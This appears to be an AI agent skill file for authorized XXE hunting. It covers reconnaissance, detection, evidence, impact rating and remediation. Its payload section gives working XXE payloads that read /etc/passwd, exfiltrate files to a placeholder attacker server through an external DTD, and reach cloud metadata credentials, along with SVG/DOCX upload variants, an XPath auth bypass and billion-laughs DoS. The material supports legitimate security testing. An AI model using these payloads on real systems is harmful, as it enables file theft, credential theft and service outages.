---
name: xxe
description: "Canonical XML External Entity (XXE) capability: classic file-read XXE, blind OOB XXE, XXE-to-SSRF, XXE via file uploads (SVG/DOCX/XLSX/PPTX), SAML/SOAP XXE, XPath injection, XML billion-laughs DoS. Consolidates 3 sub-skills: hunt-xxe, testing-for-xml-injection-vulnerabilities, testing-for-xxe-injection-vulnerabilities. Use when hunting or validating xxe-related vulnerabilities."
sources: consolidated, hackerone_public
report_count: 10
---

# XXE — Canonical Capability

## 1. Identity and purpose

This is the single primary executable capability for XML External Entity injection (XXE) (CWE-611, OWASP A05:2021 Security Misconfiguration / A03:2021 Injection). It consolidates 3 previously separate sub-skills (`hunt-xxe`, `testing-for-xml-injection-vulnerabilities`, `testing-for-xxe-injection-vulnerabilities`) into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Discover XML processing endpoints, file-upload parsers, SOAP/SAML services, and hidden XML consumers across targets.
- Validate XXE with in-band file reads, blind OOB callbacks, SSRF to internal/cloud metadata, and error-based exfiltration.
- Cover classic SYSTEM entity, parameter-entity blind chains, XInclude, local-DTD repurposing, and parser-specific bypasses.
- Produce reproducible, impact-rated findings with remediation guidance.

## 2. Scope

In scope:
- Classic in-band XXE file read (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`).
- Blind OOB XXE via external DTD (parameter-entity chains) with DNS/HTTP/FTP exfiltration.
- XXE-to-SSRF (internal services, cloud metadata 169.254.169.254, port scanning).
- XXE via file uploads (SVG, DOCX/XLSX/PPTX, PDF, OOXML) and document parsers (Apache POI, python-docx, LibreOffice).
- SAML/SSO, SOAP, XML-RPC, WSDL, WebDAV, RSS/Atom, sitemap endpoints.
- XPath injection (auth bypass, data extraction, blind boolean-based).
- XML billion-laughs / quadratic-blowup DoS.
- Error-based exfiltration via local-DTD repurposing (zero egress).
- Parser-specific schemes: `php://`, `netdoc://`, `jar:`, `expect://`, `gopher://`.

Out of scope (hand off):
- Pure injection classes (SQLi, command injection, SSTI) → their own capabilities.
- XSS/markup without XML entity processing → `hunt-xss` / `hunt-html-injection`.
- Deserialization gadgets triggered by XML parsers (e.g., Magento CosmicSting nested deser) → `hunt-deserialization` / `hunt-rce`.
- Auth/session flaws unrelated to XML → `hunt-auth-bypass` / `hunt-session`.

## 3. Invocation and routing

Use this capability when:
- A target processes XML in request bodies, cookies, headers, file uploads, or SAML/SOAP messages.
- Content-Type can be switched to `application/xml`/`text/xml` and the endpoint parses XML.
- File uploads accept XML-based formats (SVG, DOCX, XLSX, PPTX, PDF, GPX, KML).
- You are validating XXE with Burp Suite, interactsh, XXEinjector, or OXML_XXE.
- A finding involves external entities, DTDs, parameter entities, or XPath injection.

Routing notes:
- Hunting/discovery routes to `references/hunt-xxe.md` (attack surface, signals, phases, disclosed cases, parser matrix).
- Structured exploitation (workflows, tools, scenarios, output format) routes to `references/testing-for-xxe-injection-vulnerabilities.md` and `references/testing-for-xml-injection-vulnerabilities.md`.
- Detection agent usage routes to `testing-for-xxe-injection-vulnerabilities/scripts/agent.py` and `testing-for-xml-injection-vulnerabilities/scripts/agent.py` plus their `api-reference.md`.

## 4. Inputs and outputs

Inputs:
- Target base URLs, endpoints, cookies, parameters, headers, request templates.
- Optional: Burp Suite project, test accounts, callback host (interactsh/Collaborator/xxeserv).
- Optional: source code access for locating `DocumentBuilder`, `simplexml_load_string`, `lxml`, `DOMDocument`.
- Optional: sample XML-based files (SVG/DOCX/XLSX/PPTX) for upload endpoints.

Outputs:
- Confirmed or refuted XXE findings with file content, SSRF response, or OOB callback proof.
- Parser/format identification and affected library versions.
- Reproduction steps, impact assessment, and remediation guidance.
- False-positive rulings with disproof rationale.

## 5. Preconditions and authorization

- Confirm written authorization and testing scope before any payload execution.
- Use only test accounts and authorized targets; never trigger state changes on real users' data.
- Prefer safe detection first (inline entity echo `<!ENTITY hello "world!">`) before SYSTEM file reads.
- Avoid destructive payloads (billion laughs) unless DoS is in scope; use minimal probes.
- Respect rate limits and stop at account/tenant boundaries; document out-of-scope endpoints.
- Never exfiltrate real PII beyond proof-of-concept; redact in reports.

## 6. Reconnaissance

Recon steps:
1. Spider authenticated sessions and collect all endpoints; flag requests/responses with XML content types (Burp passive scanner).
2. Intercept JSON endpoints and manually swap `Content-Type` to `application/xml` with an equivalent XML body (content-type swap).
3. Identify file-upload features accepting SVG, DOCX, XLSX, PPTX, PDF, GPX, KML, RSS, ATOM.
4. Probe for SOAP/WSDL (`?wsdl`), XML-RPC (`/xmlrpc`), WebDAV, SAML ACS (`/saml/acs`, `/sso/saml`), feed/sitemap endpoints.
5. Inspect JavaScript bundles for `XMLSerializer`, `DOMParser`, `parseFromString`, `xml2js`, `libxmljs`, `lxml`.
6. Fingerprint tech stack: `Server: Apache Tomcat`/`X-Powered-By: Servlet` → Java (likely vulnerable); PHP `DOMDocument`; .NET `XmlDocument`; Python `lxml` (often safe for file read).
7. Review source (if available) for `DocumentBuilder`, `SAXParser`, `XMLReader`, `simplexml_load_string`, `DOMDocument::loadXML`, `lxml.etree`, `Nokogiri`, `REXML`, and missing `FEATURE_EXTERNAL_GENERAL_ENTITIES`/`setExpandEntityReferences` hardening.
8. Enumerate subdomains sharing the same backend XML processing service.

See `references/hunt-xxe.md` (attack surface signals, URL/header/JS patterns, tech stack signals).

## 7. Detection methodology

Core detection flow:
1. Identify XML entry points and classify format (SOAP, REST-XML, upload, SAML, RSS).
2. Run the inline-entity probe first: `<!ENTITY hello "world!">` then `&hello;` in a node. If `hello!` does not echo, entity expansion is disabled — pivot or stop.
3. Attempt classic in-band file read targeting `/etc/passwd` or `C:\Windows\win.ini`; observe reflection.
4. If no reflection, pivot to blind OOB: inject external entity pointing to your callback URL; confirm DNS/HTTP hit.
5. Escalate blind OOB to file exfiltration via two-stage parameter-entity DTD (file → OOB HTTP/FTP/DNS).
6. Test SSRF pivot: point entity at internal addresses (169.254.169.254, 10.0.0.1, localhost:8080); look for timing/response differences.
7. Test XPath injection on XML-backed search/auth endpoints.
8. Test XInclude when DOCTYPE is blocked: `<xi:include href="file:///etc/passwd" parse="text"/>`.
9. Test local-DTD repurposing for error-based exfil when egress is blocked.
10. Validate with a clean reproduction (raw HTTP/curl) and record parser/library versions.

References by phase:
- Hunting/bypasses/parser matrix/disclosed cases: `references/hunt-xxe.md`.
- Exploitation workflow/tools/scenarios: `references/testing-for-xxe-injection-vulnerabilities.md` and `references/testing-for-xml-injection-vulnerabilities.md`.

## 8. Technique selection

Select techniques by observed parser/defenses:
- Java SAX/DOM without hardening → classic SYSTEM file read; `netdoc://`, `jar:` wrappers; JAX-WS/SOAP.
- PHP `DOMDocument`/`simplexml_load_string` with `LIBXML_NOENT` → classic read; `php://filter/convert.base64-encode/resource=` for binary-safe read; `expect://` for RCE.
- .NET `XmlDocument` with `XmlResolver` set / `XmlReader` with `DtdProcessing=Parse` → classic read; SOAP endpoints.
- Python `lxml` (verified 6.x) → drops SYSTEM file content even with `resolve_entities=True`; may still issue network fetches when `no_network=False` → SSRF/OOB possible, file read not. Python `xml.etree` ≥ 3.7.1 → safe by default.
- Ruby Nokogiri default → safe; only if `DTDLOAD` option enabled.
- DOCTYPE blocked → XInclude (`xi:include`) or content-type tricks.
- Network egress blocked → error-based exfil via local DTD repurposing (zero egress) or DNS-only exfil.
- WAF blocks keywords → case variation, UTF-16 encoding, parameter entities, XML comments, chunked transfer.
- Blind (no reflection) → OOB DNS/HTTP callback; two-stage parameter-entity DTD; FTP for multi-line.
- File upload → SVG/DOCX/XLSX/PPTX with embedded DTD; OXML_XXE tooling.

See `references/hunt-xxe.md` (bypass techniques, parser matrix) and the testing references (workflows).

## 9. Execution steps

1. Establish baseline request for each candidate endpoint/upload/SOAP/SAML service.
2. Replay with one controlled change at a time; record status, body, timing, headers.
3. Detect parser via inline-entity probe; classify as vulnerable/hardened.
4. For vulnerable parsers, attempt classic file read; confirm reflection of file content.
5. For blind cases, set up OOB listener (interactsh/Collaborator/xxeserv); inject external entity; confirm callback.
6. Escalate to file exfiltration via two-stage parameter-entity DTD; capture contents.
7. Test SSRF: internal addresses and cloud metadata; record reachable services/creds.
8. Test XPath injection on XML-backed parameters.
9. For file uploads, craft malicious SVG/DOCX/XLSX/PPTX and observe server-side processing.
10. For DoS, only if in scope: billion-laughs/quadratic-blowup with minimal amplification.
11. Capture affected parser/library versions and configuration evidence.
12. Stop and document when a vector is not exploitable or out of scope.

## 10. Tool usage

- HTTP proxy: Burp Suite (Repeater, Collaborator, Content Type Converter, XXE Scanner extension).
- OOB: interactsh-client, Burp Collaborator, xxeserv (FTP/HTTP listener), netcat.
- Automation: XXEinjector (file exfiltration + SSRF), OXML_XXE (Office XML payloads), OWASP ZAP active scan.
- XML validation: xmllint, Python lxml/defusedxml.
- Detection agent: `testing-for-xxe-injection-vulnerabilities/scripts/agent.py`, `testing-for-xml-injection-vulnerabilities/scripts/agent.py` (scan cookies/body, format detection, probes) plus `api-reference.md`.
- Evidence: saved requests/responses, OOB callback logs, exfiltrated file contents, screenshots, canary values.

See `references/testing-for-xxe-injection-vulnerabilities.md` (tools & systems) and `references/hunt-xxe.md` (automation/grep patterns).

## 11. Payloads and test cases

Classic in-band file read:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

Windows equivalent:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>
```

PHP filter wrapper (base64):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
```

Blind OOB — DNS/HTTP callback:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">
]>
<root><data>&xxe;</data></root>
```

Blind OOB — file exfiltration via parameter entity (two-stage):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<root><data>trigger</data></root>
```
evil.dtd (hosted on attacker server):
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%all;
```

SSRF via XXE (AWS metadata):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&ssrf;</data></root>
```

SVG XXE (file upload):
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

DOCX/XLSX XXE (inject into `[Content_Types].xml` or `word/document.xml`):
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
```

Content-Type swap (JSON to XML):
```bash
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net">]><user>&xxe;</user>'
```

Error-based exfil via local-DTD repurposing (zero egress):
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
    %eval; %err;'>
  %local_dtd; ]>
```

XPath injection (auth bypass):
```bash
curl -X POST http://target.com/login \
  -d "username=' or '1'='1&password=' or '1'='1"
```

Billion laughs (DoS, authorized only):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root><data>&lol3;</data></root>
```

XInclude (when DOCTYPE blocked):
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

Java-specific wrappers:
```xml
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/">
```

Additional variants (case variation, UTF-16, chunked transfer, DNS-only exfil, parameter-entity bypasses) live in `references/hunt-xxe.md` and the testing references.

## 12. Evidence

Each finding must include:
- Exact request and response (raw HTTP, cookie/param values, body, Content-Type).
- XML payload used and entity declaration.
- Reflection of file content OR OOB callback log (DNS/HTTP/FTP) with timestamps.
- For SSRF: internal service response or cloud metadata JSON.
- Parser/library version and configuration evidence (e.g., Java `DocumentBuilderFactory`, PHP `libxml` version, .NET framework).
- Authentication context (account/role) and server-side effect.
- Impact assessment and affected scope (subdomains sharing backend).

## 13. Reproduction and validation

- Reproduce with curl or a saved raw request in a clean session where possible.
- Validate with safe detection first (inline entity echo), then escalate to SYSTEM file read/OOB.
- Confirm with two accounts/roles where applicable; verify execution context.
- For blind vectors, confirm via OOB callback; mark refuted if no callback after repeated attempts.
- For SSRF, confirm via timing/response differences or metadata content.
- For file uploads, confirm via rendered output or OOB callback from the parser.
- Mark as refuted if the payload does not execute or no concrete impact exists.

## 14. False-positive rejection

Reject or downgrade when:
- The XML is not actually parsed server-side (no reflection/callback/effect).
- Parser is hardened: inline entity probe fails to echo (`hello!` not returned) → entity expansion disabled → SYSTEM file:// won't work.
- Parser is a known-safe default (Python `xml.etree` ≥ 3.7.1, `lxml` file read drops content, Ruby Nokogiri default, .NET 4.5.2+ `DtdProcessing.Prohibit`).
- OOB callback is caused by another component (image fetch, redirect) rather than XML entity resolution.
- Response differences are due to caching, localization, or benign metadata.
- XXE only triggers an OOB DNS callback with NO data exfil → Low/Medium (information disclosure), not Critical.
- DoS (billion laughs) not in scope or mitigated by entity limits.
- XPath injection is actually a normal search result or handled by parameterized queries.

## 15. Impact

Impact guidance:
- Critical: XXE file read of secrets (DB creds, AWS IAM keys, private keys) or SSRF to cloud metadata yielding credentials; XXE-to-RCE (`expect://`, XSLT).
- High: Blind OOB exfiltration of sensitive files; internal service access/port scanning; SAML XXE leading to auth bypass.
- Medium: XXE SSRF to internal services without credential exposure; error-based file content leak; XPath injection data extraction.
- Low: OOB DNS/HTTP callback only with no data exfil; DoS potential; missing hardening without exploit path.

Always tie impact to concrete data exposure or internal access; "parser made a DNS request" is not impact.

## 16. Reporting

Report template:
- Summary: endpoint/upload/SOAP/SAML service, vulnerability type (XXE), impact.
- Scope/authorization: test targets and accounts.
- Steps to reproduce: numbered, minimal (inline probe → classic read or OOB → exfil).
- Proof of concept: raw request/response, payload, OOB callback log, exfiltrated content (redacted).
- Affected component: parser/library/version and configuration.
- Impact: business and data scope; reachable internal services/cloud creds; affected subdomains sharing backend.
- Remediation: disable external entity processing and DTDs (`FEATURE_EXTERNAL_GENERAL_ENTITIES=false`, `setExpandEntityReferences(false)`, `LIBXML_NOENT` not set, `DtdProcessing=Prohibit`, `defusedxml`, `XMLConstants.FEATURE_SECURE_PROCESSING`); use JSON instead of XML where possible; schema validation with strict DTD restrictions; block outbound connections from XML processing services; least-privilege filesystem permissions; patch CosmicSting-class nested deserialization.
- References: OWASP A05:2021, CWE-611, PortSwigger XXE, relevant CVEs (CVE-2024-34102 CosmicSting, CVE-2021-2471 MySQL JDBC XXE).

## 17. Failure modes

- Surface not fully discovered → expand recon (JS bundles, mobile apps, SOAP/WSDL, file uploads, RSS/SVG).
- No test account → request credentials or scope clarification; do not bypass without authorization.
- WAF/gateway blocks payloads → try case variation, UTF-16/UTF-8 encoding, parameter entities, XML comments, chunked transfer, content-type mismatch.
- Rate limiting stops testing → coordinate throttling or test windows.
- Blind XXE inconclusive → repeat with fresh sessions and timing/OOB diff; verify collaborator host and egress; test multiple input locations; mark not confirmed if ambiguous.
- Tooling unavailable (XXEinjector/xxeserv) → install or use manual DTD hosting; document limitation.
- Parser hardened → document as not vulnerable; pivot to other endpoints/subdomains.
- File upload not parsed server-side → try different formats/paths; check async processing.

## 18. References

All 3 sub-skill references are preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/hunt-xxe.md` | `hunt-xxe` | Hunting/bypasses, attack surface, phases, parser matrix, disclosed cases |
| `references/testing-for-xml-injection-vulnerabilities.md` | `testing-for-xml-injection-vulnerabilities` | XML injection workflow, payloads, tools, scenarios, output format |
| `references/testing-for-xxe-injection-vulnerabilities.md` | `testing-for-xxe-injection-vulnerabilities` | XXE exploitation workflow, file uploads, SSRF, OOB exfiltration |

Original sub-skills remain intact under `hunt-xxe/`, `testing-for-xml-injection-vulnerabilities/`, and `testing-for-xxe-injection-vulnerabilities/` (including `api-reference.md` and `scripts/agent.py` under the latter two).

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_xxe_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: PortSwigger XXE labs, OWASP WebGoat, DVWA, HackTheBox.
- Mastery criteria: independently discover, validate, and report an XXE finding with full reproduction, parser/library version, exfiltrated content or OOB proof, and impact.


## Knowledge sources

- WKS bug classes: xxe
- Domain knowledge: xxe
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
